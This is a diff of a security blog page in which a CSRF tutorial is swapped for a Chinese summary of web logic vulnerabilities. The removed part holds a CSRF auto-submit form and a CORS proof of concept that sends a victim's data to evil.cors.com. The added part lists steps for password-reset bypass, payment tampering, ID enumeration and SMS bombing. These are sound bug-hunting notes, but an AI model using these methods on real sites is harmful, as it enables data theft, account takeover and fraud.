@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>CSRF · H0e4a0r1t&#39;s Blog</title>
+    <title>逻辑漏洞案例总结 · H0e4a0r1t&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/">H0e4a0r1t&#39;s Blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">CSRF</a>
+                <a href="#" class="post-name">逻辑漏洞案例总结</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            CSRF
+            逻辑漏洞案例总结
             <!-- 404 -->
             
         </h1>
@@ -266,12 +266,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">841</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">2.6k</span>阅读时长: <span class="post-count reading-time">8 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/05/04</span>
+                    <span class="post-intro-time">2019/07/12</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -395,50 +395,104 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="0x00-什么是CSRF？"><a href="#0x00-什么是CSRF？" class="headerlink" title="0x00.什么是CSRF？"></a>0x00.什么是CSRF？</h2><p>通俗简单点理解就是本该是你本人操作的步骤，攻击者已经给你模拟好了，而只差被系统误认为是你本人在操作，所以只需要你的好奇心驱使你点一下恶意链接，本质上就是你做的操作，只不过操作的value已经被攻击者设置好了，你只是负责触发，即只差你这个身份凭证了。</p>
-<h2 id="0x01-CSRF简单演示"><a href="#0x01-CSRF简单演示" class="headerlink" title="0x01.CSRF简单演示"></a>0x01.CSRF简单演示</h2><p>这里就拿DVWA来做演示</p>
-<p>正常用户修改密码操作，这里并未做任何用户凭证的校验</p>
-<p><img src="https://i.loli.net/2019/05/04/5ccd946d5eb7b.png" alt></p>
-<p>抓包，可以看到，模拟用户修改密码为123456并提交</p>
-<p><img src="https://i.loli.net/2019/05/04/5ccd946ccd03e.png" alt></p>
-<p>BurpSuite自带有构造CSRF的poc的工具</p>
-<p><img src="https://i.loli.net/2019/05/04/5ccd946d8ee72.png" alt></p>
-<p><img src="https://i.loli.net/2019/05/04/5ccd946d9de9d.png" alt></p>
-<p>也可以自己构造</p>
-<p><img src="https://i.loli.net/2019/05/04/5ccd946d7f0a1.png" alt></p>
-<p>CSRF表单自动提交代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=&quot;postxss&quot; method=&quot;post&quot; action=&quot;?前面的url&quot; hidden=&quot;hidden&quot;&gt;</span><br><span class="line">   &lt;input type=&quot;text&quot; name=&quot;&quot;(可从源代码中查看) value=&quot;想要设定的内容&quot; hidden=&quot;hidden&quot; /&gt;</span><br><span class="line">   &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.postxss.submit();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-JSONP劫持（读取型CSRF）"><a href="#0x02-JSONP劫持（读取型CSRF）" class="headerlink" title="0x02.JSONP劫持（读取型CSRF）"></a>0x02.JSONP劫持（读取型CSRF）</h2><h3 id="漏洞案例"><a href="#漏洞案例" class="headerlink" title="漏洞案例"></a>漏洞案例</h3><p>这里jsonp做跨域资源共享，通过callback回调函数来获取参数为foo的json格式的数据</p>
-<p><img src="https://i.loli.net/2019/05/04/5ccda1df6680a.png" alt></p>
-<p>构造POC</p>
-<p><img src="https://i.loli.net/2019/05/04/5ccda1df3ba5b.png" alt></p>
-<p>用户点开链接后即被劫持</p>
-<p><img src="https://i.loli.net/2019/05/04/5ccda1df5ed93.png" alt></p>
-<h2 id="0x03-CORS跨域读取"><a href="#0x03-CORS跨域读取" class="headerlink" title="0x03.CORS跨域读取"></a>0x03.CORS跨域读取</h2><p>挖掘思路：添加Ogrin头部信息，看返回的数据里面有没有Access-Control-Allow-Orgin这个参数出现如果有。尝试让他变成任意的url，如果在返回包里的Access-Control-Allow-Orgin这个参数后面的值有你放入的url，就可以进行cors劫持了。（acac支持传递cookie，acao支持跨域读取）</p>
-<h3 id="漏洞案例-1"><a href="#漏洞案例-1" class="headerlink" title="漏洞案例"></a>漏洞案例</h3><p>原打算放自己刚挖到的，后面因为poc传递格式还有些问题没有解决，所以找一篇案例吧</p>
-<p><a href="https://medium.com/@nahoragg/a-simple-cors-misconfig-leaked-private-post-of-twitter-facebook-instagram-5f1a634feb9d" target="_blank" rel="noopener">A Simple CORS Misconfig Leaked Private Post Of Twitter, Facebook &amp; Instagram</a></p>
-<p>在burp history中看到了有一个响应包中有<em>Access-Control-Allow-Origin:<a href="https://niche.co/" target="_blank" rel="noopener">https://niche.co</a> &amp; Access-Control-Allow-Credentials: true</em>,于是尝试通过在请求中发送自定义Origin头来进行利用，并发现服务器只检查“//niche.co”是否在Origin头中。例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Origin: https://evil.co , Access-Control-Allow-Origin: https://niche.co</span><br><span class="line">Origin: https://niche.co.evil.net, Access-Control-Allow-Origin: https://niche.co.evil.net</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2019/05/05/5ccf0615967ec.png" alt></p>
-<p>结合易受攻击的api和站点，我可以使用CORS（图像，电子邮件ID，个人资料信息，CSRF令牌等）窃取有关其他用户的任何信息，所以他做了以下POC：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;button type=&apos;button&apos; onclick=&apos;cors()&apos;&gt;CORS&lt;/button&gt;</span><br><span class="line">&lt;p id=&apos;demo&apos;&gt;&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function cors() &#123;</span><br><span class="line">var xhttp = new XMLHttpRequest();</span><br><span class="line">xhttp.onreadystatechange = function() &#123;</span><br><span class="line">if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</span><br><span class="line">var a = this.responseText; // Sensitive data from niche.co about user account</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = a;</span><br><span class="line">xhttp.open(&quot;POST&quot;, &quot;http://evil.cors.com&quot;, true);// Sending that data to Attacker&apos;s website</span><br><span class="line">xhttp.withCredentials = true;</span><br><span class="line">console.log(a);</span><br><span class="line">xhttp.send(&quot;data=&quot;+a);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhttp.open(&quot;GET&quot;, &quot;https://www.niche.co/api/v1/users/*******&quot;, true);</span><br><span class="line">xhttp.withCredentials = true;</span><br><span class="line">xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="0x04-CSRF-bypass"><a href="#0x04-CSRF-bypass" class="headerlink" title="0x04.CSRF bypass"></a>0x04.CSRF bypass</h2><ul>
-<li>删除CSRF token / Referer / XRSF Header</li>
-<li>置空token参数</li>
-<li>修改请求方法  POST修改为GET</li>
-<li>与token相同长度的任意字符串替换token</li>
-<li>固定token   即攻击者的token放在被攻击者的请求中也可以使用</li>
-<li>组合利用  可利用xss获取csrf token</li>
-</ul>
+        <h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h2 id="0x00-之前总结的"><a href="#0x00-之前总结的" class="headerlink" title="0x00.之前总结的"></a>0x00.之前总结的</h2><h2 id="1-订单处修改id导致用户信息泄露"><a href="#1-订单处修改id导致用户信息泄露" class="headerlink" title="1.订单处修改id导致用户信息泄露"></a>1.订单处修改id导致用户信息泄露</h2><p>问题参数：订单或用户Id没有被加密（抓包修改id查看返回页面是否存在敏感信息，也可以批量爆破）</p>
+<h2 id="2-找回密码处任意用户密码重置漏洞（手机号）-任意手机号注册"><a href="#2-找回密码处任意用户密码重置漏洞（手机号）-任意手机号注册" class="headerlink" title="2.找回密码处任意用户密码重置漏洞（手机号）/任意手机号注册"></a>2.找回密码处任意用户密码重置漏洞（手机号）/任意手机号注册</h2><p>输入手机号，下一步，抓包，查看返回值中是否存在验证码；或者尝试换手机号得到验证码之后验证是否可行；修改返回包状态码</p>
+<h2 id="3-手机号验证处存在短信轰炸"><a href="#3-手机号验证处存在短信轰炸" class="headerlink" title="3.手机号验证处存在短信轰炸"></a>3.手机号验证处存在短信轰炸</h2><p>输入手机号，点击发送验证码，抓包，修改其他手机号，如果发送成功，则可批量发送短信</p>
+<h2 id="4-邮箱验证处存在邮箱轰炸"><a href="#4-邮箱验证处存在邮箱轰炸" class="headerlink" title="4.邮箱验证处存在邮箱轰炸"></a>4.邮箱验证处存在邮箱轰炸</h2><p>输入邮箱号，点击发送验证码，抓包，修改其他邮箱号，如果发送成功，则可批量发送邮件</p>
+<h2 id="5-订单支付漏洞"><a href="#5-订单支付漏洞" class="headerlink" title="5.订单支付漏洞"></a>5.订单支付漏洞</h2><p>提交订单时，修改订单的数量id，例如将1改为-1，或者找到价格参数进行修改</p>
+<h2 id="6-找回密码处任意用户密码重置漏洞（邮箱号）"><a href="#6-找回密码处任意用户密码重置漏洞（邮箱号）" class="headerlink" title="6.找回密码处任意用户密码重置漏洞（邮箱号）"></a>6.找回密码处任意用户密码重置漏洞（邮箱号）</h2><p>点击找回密码，发送邮箱验证码，抓包，修改邮箱账号</p>
+<h2 id="7-登录处撞库"><a href="#7-登录处撞库" class="headerlink" title="7.登录处撞库"></a>7.登录处撞库</h2><p>登录处随便输入用户名，抓包爆破常用用户名，查看存在账号的长度和不存在的账号的长度</p>
+<h2 id="8。登录处撞库获取账号及密码"><a href="#8。登录处撞库获取账号及密码" class="headerlink" title="8。登录处撞库获取账号及密码"></a>8。登录处撞库获取账号及密码</h2><p>输入弱口令，随便输入用户名，抓包，对用户名进行撞库，匹配成功的即可获得账号密码</p>
+<h2 id="0x02-乌云案例总结"><a href="#0x02-乌云案例总结" class="headerlink" title="0x02.乌云案例总结"></a>0x02.乌云案例总结</h2><h3 id="PS：此处并无先后顺序，完全凭乌云案例的先后顺序总结😁"><a href="#PS：此处并无先后顺序，完全凭乌云案例的先后顺序总结😁" class="headerlink" title="PS：此处并无先后顺序，完全凭乌云案例的先后顺序总结😁"></a>PS：此处并无先后顺序，完全凭乌云案例的先后顺序总结😁</h3><h3 id="1-越权"><a href="#1-越权" class="headerlink" title="1.越权"></a>1.越权</h3><ol>
+<li>漏洞点：发送礼物处，遍历白帽子whitehatid来索要联系方式</li>
+<li>漏洞点：利用支付超时导致上万用户敏感信息泄漏；通过修改orderId=9272363&amp;order_userId=5311555中的orderId及order_userId的值(要同时修改，即同时增1或减1)，达到遍历用户敏感信息的操作</li>
+<li>漏洞点：收获地址保存处；修改地址后，点击保存，抓包，修改addressid达到遍历用户地址信息的操作</li>
+<li>漏洞点：登陆后获取用户信息处；抓包，修改userId遍历用户敏感信息</li>
+<li>漏洞点：预约成功后，遍历orderId获得用户信息</li>
+<li>漏洞点：加入车队处可查看车队内部人员信息，遍历车队id</li>
+<li>漏洞点：购物车结算时，抓包，修改userid查看他人地址信息</li>
+<li>漏洞点：套餐修改处，修改uid为他人id即可修改别人的套餐</li>
+<li>漏洞点：查看订单处，修改orderId遍历其他用户信息</li>
+<li>漏洞点：查看个人信息处，遍历userId，或者做删除或添加操作时，遍历userId</li>
+<li>漏洞点：删除操作，遍历id或用户名</li>
+<li>漏洞点：查看报告处，遍历报告id</li>
+<li>漏洞点：注册用户，抓包，修改id为1，即管理员id</li>
+<li>漏洞点：购买你的权限不能购买的东西，查看不能买的id，在购买能购买的东西时修改为不能买的id</li>
+<li>漏洞点：论坛注册可注册admin，间接接管了admin账号</li>
+</ol>
+<h3 id="2-重置任意用户密码"><a href="#2-重置任意用户密码" class="headerlink" title="2.重置任意用户密码"></a>2.重置任意用户密码</h3><ol>
+<li>抓包时，会将隐藏4位数的手机号变为直接显示的手机号作为参数(泄露用户手机号)，在js代码中发现验证后跳转的页面，直接进行拼接绕过验证修改密码</li>
+<li>在验证手机号或邮箱时，前端显示验证码</li>
+<li>在验证过程中将参数中目标的手机号修改为自己的，就会将验证码发到自己手机上，从而任意修改用户密码</li>
+<li>由于验证码的时效性过长，或者未限制验证次数，所以通过爆破验证码来任意重置用户密码</li>
+<li>先输入目标手机号，点击发送验证码，得到cookie中加密的手机号，再用自己的手机号正常走一遍流程，到最后一步确认修改密码的时候，抓包，将cookie中加密的手机号换为目标手机号。</li>
+<li>修改密码验证邮箱时，抓包，将目标邮箱更换为自己的邮箱，再将收到的验证码进行密码重置</li>
+<li>修改修改密码失败时的返回包中的状态码或数据 staus=1 —— staus=0；success:false ——&gt; success:true</li>
+<li>前边格式正常走，到确认修改密码的时候，将卡号修改为其他用户的</li>
+<li>修改过程中填入用户名，通过修改url里的参数来实现跳步骤绕过验证，如：step=1 ——&gt; step=4</li>
+<li>将设置密码的url中的id修改为其他用户手机号</li>
+<li>情况为：userId=xxx&amp;newpwd=xxxx&amp;renewpwd=xxx，遍历userId批量修改其他用户密码</li>
+<li>正常操作，验证时抓包，将正确的返回包中的数据保存，修改他人账号时，将之前返回包的数据复制过来修改个别参数</li>
+<li>修改自己账号的正常操作，验证完成后跳转到重置密码页面，之后打开第二个页面输入目标的手机号或邮箱账号，不发送验证码，任意输入验证码，抓包，将返回包的状态值修改为验证通过的值</li>
+<li>修改第一次验证身份的返回包数据，并修改第二次保存密码时的返回包的数据</li>
+<li>在修改密码的时候，将请求包中的username修改为其他用户</li>
+<li>前提是修改密码需要验证密保邮箱账号，从返回包中得到敏感信息，从而修改密码</li>
+<li>微信公众号，输入用户名后进入验证页面，查看源代码，将条件改为永真，绕过验证修改密码</li>
+<li>前提是重置密码链接会发到邮箱里，然后通过base64解密发现由时间戳和邮箱组成，所以可以修改其他用户的账号，然后生成时间戳并爆破</li>
+<li>重置密码请求发到邮箱后，将url中邮箱地址替换成其他用户邮箱修改</li>
+</ol>
+<h3 id="3-支付逻辑"><a href="#3-支付逻辑" class="headerlink" title="3.支付逻辑"></a>3.支付逻辑</h3><ol>
+<li>选择两件物品放入购物车，结算时修改num=1,1为1,-1使得两件物品价格相减</li>
+<li>点击支付，抓包，将参数中的价格参数修改为0.1</li>
+<li>点击支付，抓包，将参数中的价格参数修改为负数，会给自己账户返钱</li>
+<li>修改返回包中的价格参数，放包</li>
+<li>修改支付失败时返回包中的参数</li>
+<li>加入购物车后，修改数量，减为-1，即0元购物</li>
+<li>先充值100，到银行充值页面后，直接关闭页面再回来，点充值成功，在充值页面点击继续支付，将重置金额修改为0.1，点击支付</li>
+<li>购物车选择两件物品，一件物品数量修改为-1，结算时价格只算了那个未修改的，而修改为-1的也被结算，但价格不需要支付</li>
+<li>选择支付方式时，修改参数中价格的值为0.1</li>
+<li>复制支付成功的链接，将未支付的订单号复制在链接后面，直接访问</li>
+<li>通过修改订单页面中不可修改的订单价格，即F12修改其属性即价格value（仅根据前端价格判断）</li>
+<li>修改运费价格，可减少或修改为负数</li>
+<li>修改其使用时间为-1年，金额也会为-100000</li>
+<li>修改前端value的值为负数</li>
+<li>将前台的加密数据解密并修改对应的参数值，例如阿里云服务器可将5M的更换为200M并以5M的价钱买下</li>
+</ol>
+<h3 id="4-撞库"><a href="#4-撞库" class="headerlink" title="4.撞库"></a>4.撞库</h3><p>利用弱口令去爆破手机号或用户名，或爆破弱口令</p>
+<h3 id="5-任意用户登录"><a href="#5-任意用户登录" class="headerlink" title="5.任意用户登录"></a>5.任意用户登录</h3><ol>
+<li>修改返回包中字典的参数</li>
+<li>修改返回包中的参数 例：staus=1 ——&gt;  staus=0</li>
+<li>爆破验证码</li>
+<li>通过文件共享看到每个用户的凭证id，发现cookie也是id</li>
+</ol>
+<h3 id="6-恶意刷钱"><a href="#6-恶意刷钱" class="headerlink" title="6.恶意刷钱"></a>6.恶意刷钱</h3><p>凭订单号抽取奖金，通过订单号orderId遍历，获取到很多订单号，通过遍历的方式去刷取奖金</p>
+<p>凭手机验证领取保险，因为手机验证码前台显示，所以可用其他人的手机号无限给自己上保险</p>
+<p>通过修改参数中的手机号格式，来刷取优惠卷，如：原：138<strong><strong>1234；可改为：86138</strong></strong>1234；+86138<strong><strong>1234；138</strong></strong>1234！；138<strong><strong>1234asdasd；或”138</strong></strong>1234，139<strong><strong>1111”；”138</strong></strong>1234；139<em>**</em>1111”</p>
+<p>兑换现金红包时，修改url里的金额参数及数量参数</p>
+<p>可结合任意注册来刷取邀请所得奖金</p>
+<p>积分购物，将数量调至负数</p>
+<h3 id="7-短信轰炸"><a href="#7-短信轰炸" class="headerlink" title="7.短信轰炸"></a>7.短信轰炸</h3><p>发送验证码时，抓包，短时间内无限放包</p>
+<h3 id="8-任意注册"><a href="#8-任意注册" class="headerlink" title="8.任意注册"></a>8.任意注册</h3><p>爆破验证码</p>
+<p>修改返回包状态码</p>
+<p>还可以通过修改返回包状态码来恶意注册已经注册过的账号</p>
+<p>注册时，输入收到的验证码，然后点击提交时，将电话号码修改为其他的</p>
+<h2 id="0x03-楼兰博客案例总结"><a href="#0x03-楼兰博客案例总结" class="headerlink" title="0x03.楼兰博客案例总结"></a>0x03.楼兰博客案例总结</h2><ol>
+<li>重置密码请求发到邮箱后，将url中的随机值置空，并修改uid的值（修改并执行成功的前提是未发起申请）</li>
+<li>csrf+信息泄露：csrf绑定邮箱，信息泄露增加链接可信度</li>
+<li>session覆盖：修改自己账号的正常操作，验证完成后跳转到重置密码页面，之后打开第二个页面输入目标的手机号或邮箱账号，不发送验证码，任意输入验证码，抓包，将返回包的状态值修改为验证通过的值</li>
+<li>前面步骤正常走，到确认重置密码的地方，点击确认，抓包，将id修改为目标id</li>
+<li>跳过验证身份的步骤，直接跳到重置密码的步骤上</li>
+<li>重置用户一的密码时，在最后新密码发送至邮箱时，抓包，将id修改为用户二的，用户二重置的新密码就发到了用户</li>
+</ol>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="http://yoursite.com">H1e4a0r1t</a>
-            </p><p>原文链接：<a href="http://yoursite.com/2019/05/04/csrf/">http://yoursite.com/2019/05/04/csrf/</a>
-            </p><p>发表日期：<a href="http://yoursite.com/2019/05/04/csrf/">May 4th 2019, 5:42:53 pm</a>
-            </p><p>更新日期：<a href="http://yoursite.com/2019/05/04/csrf/">May 8th 2019, 10:45:59 am</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2019/07/12/2019-5-3 逻辑漏洞思路 033759/">http://yoursite.com/2019/07/12/2019-5-3 逻辑漏洞思路 033759/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2019/07/12/2019-5-3 逻辑漏洞思路 033759/">July 12th 2019, 10:42:35 am</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/07/12/2019-5-3 逻辑漏洞思路 033759/">July 12th 2019, 10:43:52 am</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -446,17 +500,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2019/05/05/wfuzz/" title="WFUZZ">
-                    <div class="nextTitle">WFUZZ</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/04/24/2019-4-23随记/" title="2019/4/23 随记">
-                    <div class="prevTitle">2019/4/23 随记</div>
+                <a href="/2019/05/09/反序列化/" title="反序列化">
+                    <div class="prevTitle">反序列化</div>
                 </a>
             
         </li>
@@ -575,7 +624,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">1.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-什么是CSRF？"><span class="toc-number">1.1.</span> <span class="toc-text">0x00.什么是CSRF？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-CSRF简单演示"><span class="toc-number">1.2.</span> <span class="toc-text">0x01.CSRF简单演示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-JSONP劫持（读取型CSRF）"><span class="toc-number">1.3.</span> <span class="toc-text">0x02.JSONP劫持（读取型CSRF）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞案例"><span class="toc-number">1.3.1.</span> <span class="toc-text">漏洞案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-CORS跨域读取"><span class="toc-number">1.4.</span> <span class="toc-text">0x03.CORS跨域读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞案例-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">漏洞案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-CSRF-bypass"><span class="toc-number">1.5.</span> <span class="toc-text">0x04.CSRF bypass</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#逻辑漏洞"><span class="toc-number">1.</span> <span class="toc-text">逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-之前总结的"><span class="toc-number">1.1.</span> <span class="toc-text">0x00.之前总结的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-订单处修改id导致用户信息泄露"><span class="toc-number">1.2.</span> <span class="toc-text">1.订单处修改id导致用户信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-找回密码处任意用户密码重置漏洞（手机号）-任意手机号注册"><span class="toc-number">1.3.</span> <span class="toc-text">2.找回密码处任意用户密码重置漏洞（手机号）/任意手机号注册</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-手机号验证处存在短信轰炸"><span class="toc-number">1.4.</span> <span class="toc-text">3.手机号验证处存在短信轰炸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-邮箱验证处存在邮箱轰炸"><span class="toc-number">1.5.</span> <span class="toc-text">4.邮箱验证处存在邮箱轰炸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-订单支付漏洞"><span class="toc-number">1.6.</span> <span class="toc-text">5.订单支付漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-找回密码处任意用户密码重置漏洞（邮箱号）"><span class="toc-number">1.7.</span> <span class="toc-text">6.找回密码处任意用户密码重置漏洞（邮箱号）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-登录处撞库"><span class="toc-number">1.8.</span> <span class="toc-text">7.登录处撞库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8。登录处撞库获取账号及密码"><span class="toc-number">1.9.</span> <span class="toc-text">8。登录处撞库获取账号及密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-乌云案例总结"><span class="toc-number">1.10.</span> <span class="toc-text">0x02.乌云案例总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PS：此处并无先后顺序，完全凭乌云案例的先后顺序总结😁"><span class="toc-number">1.10.1.</span> <span class="toc-text">PS：此处并无先后顺序，完全凭乌云案例的先后顺序总结😁</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-越权"><span class="toc-number">1.10.2.</span> <span class="toc-text">1.越权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-重置任意用户密码"><span class="toc-number">1.10.3.</span> <span class="toc-text">2.重置任意用户密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-支付逻辑"><span class="toc-number">1.10.4.</span> <span class="toc-text">3.支付逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-撞库"><span class="toc-number">1.10.5.</span> <span class="toc-text">4.撞库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-任意用户登录"><span class="toc-number">1.10.6.</span> <span class="toc-text">5.任意用户登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-恶意刷钱"><span class="toc-number">1.10.7.</span> <span class="toc-text">6.恶意刷钱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-短信轰炸"><span class="toc-number">1.10.8.</span> <span class="toc-text">7.短信轰炸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-任意注册"><span class="toc-number">1.10.9.</span> <span class="toc-text">8.任意注册</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-楼兰博客案例总结"><span class="toc-number">1.11.</span> <span class="toc-text">0x03.楼兰博客案例总结</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
